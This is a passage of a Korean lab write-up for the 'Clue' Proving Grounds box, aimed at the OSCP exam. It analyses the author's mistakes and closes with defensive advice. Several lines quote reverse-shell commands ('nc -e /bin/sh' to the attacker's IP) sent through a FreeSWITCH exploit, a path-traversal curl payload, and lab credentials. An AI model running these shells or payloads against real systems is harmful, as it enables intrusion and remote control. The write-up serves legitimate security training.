> **일반화: 나열된 공유·경로·파라미터를 PoC 예시에서 복사하지 마라.** README의 인자는 **저자의 환경**이다. 내 타겟의 값으로 바꿔야 하는 것이 무엇인지부터 센다. `smbclient -L //TARGET -N` 한 번이면 공유 목록이 나온다.

### ② `pip install` 을 다섯 번 틀렸다 — PEP 668

```
pip install smbprotocol
python pip -m smbprotocol
python pip smbprotocol
pip -m smbprotocol
python -m pip install smbprotocol
python -m pip install smbprotocol --break-system-packages   ← 성공
```

앞의 다섯 줄 중 2~4번은 문법 오류(`pip -m` 같은 건 없다)이고, 1번과 5번은 문법은 맞지만 **Kali가 거부한다.** 거부 사유는 Kali에 실제로 있는 마커 파일에 적혀 있다:

```bash
┌──(kali㉿kali)-[~]
└─$ cat /usr/lib/python3.12/EXTERNALLY-MANAGED
[externally-managed]
Error=To install Python packages system-wide, try apt install
 python3-xyz, where xyz is the package you are trying to
 install.

 If you wish to install a non-Kali-packaged Python package,
 create a virtual environment using python3 -m venv path/to/venv.
 Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
 sure you have pypy3-venv installed.
 ...
```

> [!tip] 시험장에서 이 5분을 아끼는 법
> 최신 Kali는 **PEP 668** 로 시스템 파이썬을 잠가 둔다. 익스플로잇이 요구하는 모듈을 깔 때의 선택지는 셋이다:
>
> | 방법 | 명령 | 언제 |
> |---|---|---|
> | apt 패키지 | `sudo apt install python3-smbprotocol` | **1순위.** 있으면 가장 깨끗하다 |
> | 잠금 해제 | `pip install X --break-system-packages` | **가장 빠르다.** 랩·시험에서는 이걸 쓴다 |
> | venv | `python3 -m venv v && ./v/bin/pip install X` | 시스템을 안 더럽히고 싶을 때 |
>
> **`--break-system-packages` 를 외워 두면 이 5분이 0분이 된다.**

### ③ `ssh cassie:PASSWORD@host` — 그런 문법은 없다

```
ssh cassie:SecondBiteTheApple330@192.168.115.240
```

`user:pass@host` 는 **URL 문법**이다(`curl`·`ftp`·브라우저). **`ssh` 는 받지 않는다.** ssh는 `user@host` 만 파싱하므로 `cassie:SecondBiteTheApple330` 전체를 **사용자 이름 하나**로 취급한다.

> [!note] ssh에 비밀번호를 명령줄로 주는 표준 방법은 **없다**
> 설계상 막혀 있다. 굳이 자동화하려면 별도 도구가 필요하다: `sshpass -p 'PASSWORD' ssh user@host`
> 시험에서는 그냥 프롬프트에 치는 것이 빠르고 안전하다.

### ④ cassie는 SSH가 안 된다 — **여기가 진짜 분기점이었다**

```
ssh cassie@192.168.115.240
```

![[Pasted image 20260616144300.png]] *(§3-3과 같은 화면)*

비밀번호가 맞는데도 `Permission denied, please try again.` 이 반복됐다. **여기서 "비밀번호를 잘못 훔쳤나" 로 결론지었다면 박스가 막힌다.**

관측된 사실은 "SSH가 거부했다"뿐이다. [가정] `sshd_config` 의 `AllowUsers`/`DenyUsers` 제한으로 보이나, 타겟이 정지돼 설정 파일로 확인하지 못했다.

> [!danger] **자격증명을 검증할 때는 여러 서비스에 걸어라**
> 한 서비스의 거부는 **그 서비스의 정책**일 수 있다. 이 박스가 정확히 그랬다 — 같은 비밀번호가 **SMB에서는 통과**했고, 나중에 **로컬 `su` 로도 통과**했다.
>
> **검증 순서(빠른 것부터):**
> ```bash
> smbclient -L //TARGET -U 'user%pass'          # SMB
> nxc smb TARGET -u user -p pass                # 또는 netexec
> ssh user@TARGET                                # SSH
> curl -u user:pass http://TARGET/...            # 웹 basic auth
> ```
> `~/.zsh_history` 를 보면 실제로 `smbclient -L`·`nxc smb ... --shares`·`smbclient -U ''` 같은 널 세션 시도를 여러 번 했다. 자격증명을 얻기 전 익명 열거 시도로 보인다 [가정] — 순서가 확정되지 않는다.

### ⑤ 백업의 비밀번호를 그대로 썼다 — `ClueCon` 함정

```
grep -ri 'passw'      ← ClueCon 발견
grep -ri 'Strong*'    ← 나중에 되짚어 봄. 백업본에는 없다
```

SMB로 훔친 `event_socket.conf.xml` 에는 `ClueCon` 이 들어 있었다. **그리고 그것이 FreeSWITCH의 진짜 기본 비밀번호이기도 하다** — 그럴듯해서 더 위험했다.

live 파일을 traversal로 직접 읽고서야 `StrongClueConEight021` 이 나왔다(§3-4).

> [!danger] **백업 ≠ 현재**
> `//CLUE/backup` 이라는 공유 이름이 이미 경고였다. 그 안의 파일은 **2022-08-05 자 스냅샷**이다(`smbclient` 의 `ls` 가 날짜를 보여줬다).
> **훔친 설정 파일에서 얻은 자격증명은 "후보"이지 "사실"이 아니다.** 가능하면 live 원본과 대조한다 — 이 박스는 마침 같은 경로를 traversal로 읽을 수 있었으니 비용이 0에 가까웠다.
> 대조가 불가능하면 **둘 다 시도한다.** `ClueCon` 도 `StrongClueConEight021` 도 한 번씩 넣어 보는 데 10초면 된다.

### ⑥ 리버스셸을 **타겟 자신에게** 걸었다 — 반복해서

`~/.zsh_history` 에 남은 것들이다:

```
python 49362.py -p 3000 192.168.115.240 'nc -e /bin/sh 192.168.115.240 3000'   ← ①목적지가 타겟 ②49362는 명령 실행 도구가 아님
python 47799.py 192.168.115.240 'nc -e /bin/sh 192.168.115.240 3000'           ← 목적지가 타겟
python 47799.py 192.168.178.240 'nc -e /bin/bash 192.168.178.240 3000'         ← 목적지가 타겟
python 47799.py 192.168.178.240 'nc -e /bin/bash 192.168.45.175 3000'          ← lhost가 옛 VPN IP
python 47799.py 192.168.178.240 'nc -e /bin/sh 192.168.45.179 3000'            ← 성공한 형태
```

**두 종류의 실수가 섞여 있다:**

1. **목적지를 타겟 IP로 적었다** — 타겟이 자기 자신에게 접속한다. Kali에는 아무것도 안 온다. 리스너는 조용히 기다린다
2. **`lhost` 를 옛 VPN IP로 적었다** — `192.168.45.175` · `.179` · `.196` 이 기록에 섞여 있다. **VPN IP는 세션마다 바뀐다**

그리고 첫 줄은 아예 **도구를 잘못 골랐다** — `49362.py` 는 **파일 읽기 전용**이고 명령 실행 기능이 없다. 인자로 준 `'nc -e ...'` 는 그냥 **읽을 파일 이름**으로 해석된다.

> [!danger] 리버스셸 명령을 치기 전 3초 점검
> ```bash
> ip -br a | grep tun0      # ← 매번. VPN IP는 바뀐다
> ```
> 그리고 명령을 읽을 때 **"이 IP가 나인가 상대인가"** 를 소리 내어 확인한다.
> `nc -e /bin/sh <여기는 나> <여기는 내 리스너 포트>`
>
> **증상으로 구분하는 법:**
>
> | 증상 | 원인 |
> |---|---|
> | 익스플로잇은 `Authenticated` 인데 리스너에 아무것도 안 옴 | **목적지 IP가 틀렸거나** 아웃바운드 차단 |
> | 즉시 연결됐다가 바로 끊김 | 셸 경로가 없다(`/bin/bash` 부재) |
> | 아예 인증도 실패 | 비밀번호·포트 문제 |
>
> 이 박스는 `Not shown: 65529 filtered` 였으므로(§1-2) **아웃바운드 차단을 의심할 이유도 충분히 있었다.** 그런데 실제 원인은 오타였다. **오타를 먼저 배제하고 방화벽을 의심하라** — 순서가 반대면 시간을 크게 태운다.

### ⑦ `49362.py -h TARGET` — `-h` 는 호스트가 아니라 help

```
python 49362.py
python 49362.py -h 192.168.115.240 -p 3000
python 49362.py -h 192.168.115.240 -p 3000 /etc/passwd
python 49362.py 192.168.115.240 -p 3000 /etc/passwd      ← 성공
```

`-h` 를 세 번 시도했다. Kali에서 재현하면 무슨 일이 벌어지는지 명확하다:

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ python 49362.py -h 192.168.115.240 -p 3000
usage: 49362.py [-h] [-p PORT] [-f] [-n NUMBER] target file

positional arguments:
  target               Cassandra Web Host
  file                 eg. /etc/passwd, /proc/sched_debug + /proc/<cass-web-
                       pid>/cmdline

options:
  -h, --help           show this help message and exit
  -p, --port PORT      Cassandra Web Port
  -f, --force          Run the payload even if server isn't Cassandra Web
  -n, --number NUMBER  Adjust the number of dot-dot-slash
```

**`-h` 를 만나는 순간 argparse가 도움말을 찍고 종료한다.** 뒤의 인자는 아예 읽히지 않는다. 타겟은 **위치 인자**(`target file`)다.

> [!tip] 그런데 이 "실수"가 정답을 보여줬다
> 화면에 뜬 도움말이 곧 **정확한 사용법**이다 — `target` 과 `file` 이 위치 인자이고, `-n` 으로 traversal 깊이를 조절할 수 있다는 것까지.
> **일반화: 익스플로잇을 처음 잡으면 인자를 추측하지 말고 `-h`(또는 인자 없이) 한 번 돌린다.** 3초다.
> 여기서는 우연히 그렇게 됐지만, 이걸 **의도적 첫 수**로 만들면 세 번의 시행착오가 사라진다.

### ⑧ anthony 키가 안 붙는다 — 두 가지 가설을 세우고 **둘 다 틀렸다**

`~/.zsh_history` 에 남은 추적 과정이다. 이 박스에서 가장 값진 시행착오다:

```
ssh -i ./id_rsa cassie@192.168.178.240
ssh -i ./id_rsa anthony@192.168.178.240
ssh -i ./id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa anthony@192.168.178.240
ssh -v -i ./id_rsa anthony@192.168.178.240
...
ssh -i id_rsa anthony@192.168.239.240
rm id_rsa
vi id_rsa
ssh -i ./id_rsa anthony@192.168.239.240
ssh-keygen -l -f id_rsa
ssh -i ./id_rsa root@192.168.239.240          ← 성공
```

**가설 1 — "RSA/SHA-1 이 최신 OpenSSH에서 거부된다"**
`-o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa` 를 붙였다. **합리적인 가설이다** — 키는 2048비트 RSA이고(`ssh-keygen -l` 로 확인됨), 최신 OpenSSH 클라이언트는 `ssh-rsa`(SHA-1) 서명을 기본 비활성화한다. 하지만 **원인이 아니었다.**

**가설 2 — "복사하다 키가 깨졌다"**
`rm id_rsa` → `vi id_rsa` 로 다시 붙여넣고, `ssh-keygen -l -f id_rsa` 로 **파일이 정상 파싱되는지 검증**했다. 파싱은 됐다. **역시 원인이 아니었다.**

**실제 원인 — 사용자 이름.** 키의 주석이 `anthony@clue` 라서 `anthony` 로만 시도했는데, 등록돼 있던 곳은 **root의 `authorized_keys`** 였다(§4-4).

> [!tip] 진단 순서를 바로잡으면 이 시간이 사라진다
> 두 가설 모두 **암호학·파일 무결성 문제**를 의심했다. 정작 가장 싼 변수인 **사용자 이름**은 마지막에야 바꿨다.
>
> **개인키를 주웠을 때의 순서:**
> 1. `chmod 600 id_rsa` — 퍼미션이 느슨하면 ssh가 아예 거부한다 (`UNPROTECTED PRIVATE KEY FILE!`)
> 2. `ssh-keygen -l -f id_rsa` — 파싱·비트수·주석 확인 (주석은 **힌트이지 답이 아니다**)
> 3. **사용자 이름을 전부 돌린다** ← 가장 싸고 가장 자주 맞는다. `/etc/passwd` 에서 셸 있는 계정 + `root`
> 4. 그래도 안 되면 `ssh -v` 로 서버가 키를 **거부하는지**(`Offering public key` 후 거부) **아예 안 받는지** 구분
> 5. 마지막에 알고리즘 옵션(`-o PubkeyAcceptedKeyTypes=+ssh-rsa`)
>
> `ssh -v` 를 실제로 친 기록이 있다(위 4번째 줄). **좋은 수였는데 그 출력을 근거로 3번으로 가지 않고 2번으로 갔다.**

### ⑨ IP가 세 번 바뀌었다 — 리버트마다 스크립트가 낡는다

```
192.168.115.240   ← 06-15 nmap ~ 06-16 초반
192.168.178.240   ← 06-16 중반
192.168.239.240   ← 06-22 (root 획득일)
```

`~/.zsh_history` 에 **죽은 IP로 던진 명령이 여러 줄** 남아 있다:

```
python 47799.py 192.168.115.240 'nc -e /bin/sh 192.168.45.179 3000'
python 47799.py 192.168.115.240 'nc -e /bin/sh 192.168.45.196 3000'
python 47799.py 192.168.239.240 'nc -e /bin/sh 192.168.45.196 3000'
```

`.115.240` 로 던진 두 줄은 **박스가 이미 `.239.240` 이 된 뒤**의 시도다. 타겟 IP와 lhost가 **둘 다** 낡을 수 있다는 것이 함정이다.

> [!warning] 여러 날에 걸쳐 푸는 박스의 위생
> - 세션을 시작하면 **타겟 IP와 `ip -br a` 를 먼저 확인**한다
> - 명령을 히스토리에서 재활용할 때 **IP 두 개를 모두 갱신**한다 (타겟 · lhost)
> - 변수로 빼면 실수가 줄어든다: `T=192.168.239.240; L=$(ip -br a show tun0 | awk '{print $3}' | cut -d/ -f1)`
> - 시험은 24시간 단일 세션이라 IP는 안 바뀌지만 **VPN 재접속 시 내 IP는 바뀔 수 있다**

### ⑩ 잔가지 오타들 — 각각은 사소하나 합치면 시간이다

```
python 47799.py 1921.168.115.240 'cat /etc/passwd'    ← IP 오타 (192 → 1921)
python 47799.py 1921.168.115.240 'cat etc/passwd'     ← IP 오타 + 앞 슬래시 누락
python 47799.py 192.168.115.240 'cat etc/passwd'      ← 앞 슬래시 누락
python 47799.py 192.168.115.240 'cat /etc/passwd'     ← 성공
```

`cat etc/passwd` 는 **원격 프로세스의 CWD 기준 상대 경로**가 된다. FreeSWITCH의 CWD가 어디든 거기에 `etc/passwd` 는 없으므로 실패한다. `47799.py` 는 서버 응답을 그대로 출력하므로 화면에는 `cat: etc/passwd: No such file or directory` 계열의 메시지가 왔을 것이다 — **다만 그 출력은 기록에 없다.**

> [!note] 원격 명령 실행에서는 **항상 절대 경로**를 쓴다
> 내 CWD가 아니라 **대상 프로세스의 CWD** 기준이고, 그게 어디인지 대개 모른다. `pwd` 를 먼저 한 번 실행해 보는 것이 정석이다.

### ⑪ 시간 배분 — 어디서 손절했어야 하는가

| 구간 | 실제 | 평가 |
|---|---|---|
| nmap `-p-` | 06-15 15:42–15:44 (85초) | 좋다 |
| CVE-2021-44142 시도 | 06-16 10:27–10:31 (**4분**) | **손절 판단은 훌륭했다.** 다만 기록을 안 남긴 것이 손해 |
| Cassandra Web → 자격증명 | 10:31–13:58 | pip 삽질(②)·`-h` 삽질(⑦)이 여기 낀다 |
| SMB 약탈 → live 대조 | 13:58–14:54 | `ClueCon` 함정(⑤)이 여기 |
| FreeSWITCH 셸 | 14:54–16:47 | 리버스셸 오타(⑥)가 여기 |
| **권한상승 → root** | **16:47 → 06-22** | **여기가 문제다** |

> [!danger] `sudo -l` 을 언제 쳤어야 하나
> `cassie` 로 전환한 **직후**다. 그 한 줄이 `NOPASSWD: cassandra-web` 을 즉시 보여줬고, §2-7의 발상까지는 몇 분이면 닿는다.
> 실제로는 **root 획득이 6일 뒤**다. 시험이라면 실패다.
> **셸을 잡으면 반사적으로 5개를 친다: `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab`**

### ⑫ 원본 노트에 없던 것 — 이 개작이 복원한 것들

기록을 위해 남긴다. 원본 writeup은 **성공 경로만** 담고 있었고 다음이 전부 빠져 있었다:

- CVE-2021-44142 시도 **전체** (디렉터리만 남아 있었다)
- `pip` PEP 668 삽질
- SSH 실패의 의미 (분기점이라는 사실)
- `ClueCon` → `StrongClueConEight021` 의 **백업 vs live 대조**가 왜 필요했는지
- `47799.py` 의 원본 비밀번호가 `ClueCon` 이었다는 사실 (수정 전후 대조)
- 리버스셸 IP 오타들
- anthony 키 진단의 두 가설
- IP 변천

**성공 경로만 적힌 노트는 다음 박스에서 나를 구해주지 않는다.** 시간을 태우는 것은 성공 경로가 아니라 잘못된 가정이기 때문이다.

### ⑬ 버린 경로 — 80·1337·9042·7199를 왜 안 팠는가

이 박스는 공격면이 넓었다. 판 것은 3000과 8021 둘뿐이다. 나머지의 처리를 남긴다.

| 포트 | 관측 | 판단 | 옳았나 |
|---|---|---|---|
| **80** Apache 2.4.38 | `403 Forbidden` | 디렉터리 열거를 **한 기록이 없다** | **틀렸다.** `403` 은 "루트에 인덱스가 없다"는 뜻이지 "아무것도 없다"가 아니다 |
| **139/445** Samba | 초기엔 자격증명 없음 | 널 세션 시도 후 보류 → `cassie` 확보 후 재방문 | **옳았다.** 이 재방문이 §3-3이다 |
| **1337** (내부 `netstat` 에서만 보임) | 외부 nmap엔 **filtered** | 손대지 않음 | 판단 불가 — 정체 미확인 |
| **9042** Cassandra CQL (루프백) | root 획득 후 발견 | 손대지 않음 | 무해. 이미 root였다 |
| **7199** Cassandra JMX (루프백) | root 획득 후 발견 | 손대지 않음 | 무해했지만 **주목할 유형** |

> [!danger] `403 Forbidden` 을 "막혔다"로 읽지 마라
> Apache의 루트 `403` 은 대개 `DirectoryIndex` 에 맞는 파일이 없고 `Options -Indexes` 인 상태다. **하위 경로는 멀쩡히 살아 있을 수 있다.**
> 쳤어야 할 명령:
> ```bash
> feroxbuster -u http://192.168.115.240/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x php,txt,html
> ```
> 이 박스는 3000이 먼저 뚫려서 결과적으로 손해가 없었다. **하지만 3000이 막혔다면 80이 다음 후보였고, 그 준비가 안 돼 있었다.**

> [!tip] 루프백 JMX(7199)는 그 자체로 권한상승 경로다 — 기억해 둘 유형
> Cassandra의 JMX 포트는 기본적으로 **인증 없이 루프백에 열린다**(`LOCAL_JMX=yes`). JMX는 MBean을 통한 원격 코드 실행 경로가 알려져 있고, 서비스가 `cassandra` 계정으로 돌면 그 계정을 얻는다.
> 이 박스에서는 이미 root였으므로 무의미했지만, **`sudo -l` 이 비어 있었다면 이게 다음 후보**였다. 루프백 서비스는 포트포워딩으로 꺼낸다:
> ```bash
> ssh -L 7199:127.0.0.1:7199 cassie@TARGET      # SSH가 되면
> ./chisel client KALI:8000 R:7199:127.0.0.1:7199   # 안 되면 chisel
> ```
> **일반화: `netstat -tulpn` 의 `127.0.0.1:*` 줄은 전부 "아직 안 본 공격면"이다.** 밖에서 안 보인다고 없는 게 아니라, **밖에서 안 보이니까 방어가 느슨한** 쪽이다.

---

## 7. OSCP 시험 관점

1. **파일 읽기를 얻으면 `/proc/self/cmdline` · `/proc/self/environ` 부터 간다.** 자격증명을 CLI 인자·환경변수로 받는 서비스가 널려 있다. `/etc/passwd` 는 동작 확인용이지 목표가 아니다.
2. **자격증명 하나를 얻으면 열린 포트 전부에 시도한다.** 한 서비스의 거부는 그 서비스의 정책이다. 이 박스는 **SSH 거부 / SMB 통과 / 로컬 `su` 통과** 였다.
3. **백업본의 자격증명은 후보다.** live 원본과 대조할 수 있으면 대조하고, 못 하면 둘 다 시도한다.
4. **`sudo -l` 에 낯선 바이너리가 뜨면 "그게 무슨 일을 하는가"를 묻는다.** GTFOBins는 목록이지 사고법이 아니다. **읽는 프로그램 → 임의 파일 읽기 / 쓰는 프로그램 → 임의 파일 쓰기 / 듣는 프로그램 → 그 서비스의 모든 결함이 root 결함.**
5. **이미 아는 취약점을 더 높은 권한으로 다시 걸 수 있는지 본다.** 이 박스의 권한상승에는 새 취약점이 없다.
6. **개인키를 주우면 사용자 이름을 전부 돌린다.** 주석(`anthony@clue`)은 라벨이지 소유자가 아니다. `-o BatchMode=yes` 를 붙여 루프가 멈추지 않게 한다.
7. **`curl` 로 traversal을 칠 때 `--path-as-is` 는 필수다.** 없으면 curl이 `../` 를 **보내기 전에** 접는다(실측 확인). 브라우저 주소창도 같은 이유로 못 쓴다.
8. **자동 도구 없이 같은 결과를 얻는 법** — 이 박스는 자동 익스플로잇 도구를 쓰지 않았다(`sqlmap` 등 금지 대상 없음). 공개 PoC는 시험 허용이며, 그마저 없이도 된다:
   - Cassandra Web traversal → `curl --path-as-is http://T:3000/../../../../../../../../etc/passwd`
   - FreeSWITCH ESL → `nc T 8021` 로 `auth <pw>` + 빈 줄, `api system <cmd>` + 빈 줄
9. **익스플로잇을 실행하기 전에 소스를 읽어라.** `49362.py` 의 자격증명 채굴 아이디어는 **주석에 적혀 있었다.** `47799.py` 의 하드코딩 비밀번호도 소스를 봐야 보인다.
10. **처음 잡은 스크립트는 `-h` 부터 돌린다.** 3초로 세 번의 시행착오를 없앤다.
11. **버전이 취약 범위에 들어도 설정 게이트가 있으면 안 터진다.** CVE-2021-44142는 Samba 4.9.5(범위 안)였지만 `vfs_fruit`+`fruit:metadata=netatalk`+실재하는 공유가 전부 필요했다.
12. **PoC README의 예시 인자를 복사하지 마라.** 공유 이름·경로·포트는 저자의 환경이다.
13. **Kali에서 `pip install` 이 막히면 `--break-system-packages`.** PEP 668.
14. **플래그가 `/home/*` 에 없으면 서비스 계정 홈을 본다.** `/etc/passwd` 6번째 필드가 후보 목록이다. 그리고 **`proof.txt` 가 미끼일 수 있다** — 반드시 `ls` 로 주변을 본다.
15. **리버스셸 목적지가 나인지 상대인지 소리 내어 확인한다.** `ip -br a` 는 매번.
16. **셸을 잡자마자 칠 5개**: `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab` — 여기에 **`netstat -tulpn`** 을 더한다. 이 박스는 내부에서 포트가 **5개 더** 보였다.

---

## 8. 방어 관점

- **Cassandra Web을 인터넷에 두지 않는다.** 0.6.0에서 고쳐졌으나 저자 자신이 *"컨테이너/샌드박스/AppArmor 안에서 돌리라"* 고 권한다. 관리 UI는 VPN·localhost 뒤에 둔다.
- **비밀을 CLI 인자로 넘기지 않는다.** `ps aux` 와 `/proc/*/cmdline` 으로 같은 호스트의 모든 사용자에게 노출된다. 환경변수 파일(`EnvironmentFile=` + `0600`)이나 설정 파일을 쓴다.
- **FreeSWITCH ESL에 ACL을 적용한다.** `event_socket.conf.xml` 의 `apply-inbound-acl` 주석을 풀고(`loopback.auto`), `listen-ip` 를 `127.0.0.1` 로 내린다. 비밀번호를 바꾼 것만으로는 부족했다 — **네트워크 노출 자체가 문제**다.
- **백업 공유에 설정 파일을 넣지 않는다.** `//CLUE/backup` 에 `/etc/freeswitch` 전체가 들어 있었다. 백업은 별도 자격증명·별도 네트워크에 두고, 자격증명이 든 파일은 암호화한다.
- **`sudo NOPASSWD` 를 네트워크 서비스 바이너리에 주지 않는다.** `cassandra-web` 처럼 **인자를 자유롭게 받고 소켓을 여는** 프로그램은 사실상 `NOPASSWD: ALL` 이다. 꼭 필요하면 인자까지 고정한다: `cassie ALL=(root) NOPASSWD: /usr/local/bin/cassandra-web -B 127.0.0.1:3000`
- **root의 `authorized_keys` 를 관리한다.** 개인 키를 root에 등록하는 관행이 이 박스의 최종 관문이었다. `PermitRootLogin prohibit-password` 조차 **키 로그인은 허용**한다 — `PermitRootLogin no` 가 필요하다.
- **Samba `vfs_fruit`** 을 쓰지 않는다면 `vfs objects` 에서 뺀다(CVE-2021-44142 공식 완화책). 쓴다면 4.13.17 / 4.14.12 / 4.15.5 이상으로 올린다.
- **탐지** — 웹 액세스 로그의 URI에 `%2e%2e%2f`·`../` 가 보이면 즉시 지표다. ESL 8021에 대한 외부 연결, `/proc/*/cmdline` 접근 시도도 마찬가지다.

---

## 9. 참고 자료

- **이 박스를 뚫는 데 쓴 것 중 CVE 번호가 붙은 것은 없다** — 그래서 프론트매터에 `manual_cves: true` 만 선언하고 `cves:` 목록은 두지 않았다. 이 선언이 없으면 본문에 10여 번 나오는 **막다른 길 CVE-2021-44142 가 이 박스의 CVE 로 색인된다**
- Cassandra Web 0.5.0 임의 파일 읽기: EDB **49362** https://www.exploit-db.com/exploits/49362 (`Codes: N/A` · `Verified: False`) · 벤더 https://github.com/avalanche123/cassandra-web (v0.6.0에서 수정)
- FreeSWITCH `mod_event_socket` 명령 실행: EDB **47799** — Kali 실제 경로는 `/usr/share/exploitdb/exploits/windows/remote/47799.txt` (**`.txt` 확장자**)
- `Rack::Protection` (`PathTraversal` 미들웨어 포함): https://github.com/sinatra/sinatra/tree/main/rack-protection
- **막다른 길**: CVE-2021-44142 (Samba `vfs_fruit` 힙 OOB read/write)
  - 벤더 어드바이저리: https://www.samba.org/samba/security/CVE-2021-44142.html — 4.13.17 미만 전부 영향, 수정 4.13.17 / 4.14.12 / 4.15.5, 전제 `fruit:metadata=netatalk` 또는 `fruit:resource=file`
  - 사용한 PoC: https://github.com/horizon3ai/CVE-2021-44142 (클론본 `~/PG/Clue/CVE-2021-44142/`)
  - 원 분석: 0xsha, "A Samba Horror Story (CVE-2021-44142)" https://0xsha.io/blog/a-samba-horror-story-cve-2021-44142
  - AppleSingle/AppleDouble 포맷 명세 (PoC의 `apple.py` 가 인용): https://web.archive.org/web/20180311140826/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf
- `curl --path-as-is`: https://curl.se/docs/manpage.html#--path-as-is
- PEP 668 (externally managed environments) / Kali: https://www.kali.org/docs/general-use/python3-external-packages/
- OSCP Exam Guide, "Exam Proofs": https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide

---

## 남긴 흔적 (랩 정리용)

- **띄운 프로세스** — `sudo -u root cassandra-web -B 0.0.0.0:9999` 가 **root 권한으로 남았다.** 명시적으로 종료한 기록이 없다. [가정] 리버트로 소멸. 실전이라면 반드시 죽여야 할 것이다 — **인증 없는 root 권한 임의 파일 읽기를 외부에 열어 둔 상태**다.
- **리버스셸** — `nc -e /bin/sh` 로 띄운 FreeSWITCH 계정 셸, 그리고 그 위의 `su cassie`.
- **타겟에 올린 파일 없음** — 모든 도구는 Kali에서 원격으로 실행했다.
- **약탈한 데이터** — `~/PG/Clue/freeswitch/` (245개 파일, `/etc/freeswitch` 전체) · `~/PG/Clue/cassandra/` (Cassandra 3.11.13 설치본). **타겟 원본은 수정하지 않았다**(읽기만).
- **획득 자격증명**
  - `cassie` / `SecondBiteTheApple330` (SMB · 로컬 `su` 가능, **SSH 불가**)
  - FreeSWITCH ESL / `StrongClueConEight021` (백업본의 `ClueCon` 은 **낡은 값**)
  - `anthony@clue` 주석이 붙은 RSA 2048 개인키 (`SHA256:PN6pyaVqalSAe2eLdTcog5/dsxHYnOaaDsqKw/vYRPs`) — **실제로는 root 로그인용**. 사본 `~/PG/Clue/id_rsa`

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[_STATUS]] — 전수 진행현황
- [[Flu]] — **자매 노트.** 같은 계열의 교훈이 겹친다: 공개 PoC의 버전·CVE 표기를 검증하라, 파일 읽기 프리미티브는 권한 경계를 못 넘는다, 리버스셸 `lhost` 점검
- [[RubyDome]] — 누적 패턴 **"`sudo -l` 이 좁아도 대상의 권한을 확인하라. 내가 쓸 수 있으면 사실상 `NOPASSWD: ALL` 이다"**. 이 박스의 §4-1이 정확히 그 사례
- [[plum]] — 누적 패턴 "익스플로잇 전에 버전과 취약 범위를 대조하라". 이 박스의 §2-6은 **버전은 맞았으나 설정 게이트가 안 맞은** 변형
- [[Squid]] — 누적 패턴 "응답이 성공을 뜻하지 않는다" · 내부에서 본 포트가 외부 nmap보다 넓다(§4-2)
- [[Hub]] · [[Levram]] — 누적 패턴 "버전 판정은 독립 근거 2개". §1-3은 그것을 **만족하지 못한 채 던진** 반례
- [[Exfiltrated]] · [[Hawat]] — 훔친 설정 파일에서 자격증명을 캐는 같은 계열
- [[Butch]] — ⚠️ 웹셸로 얻은 플래그는 OSCP에서 0점. 증거 스크린샷 형식
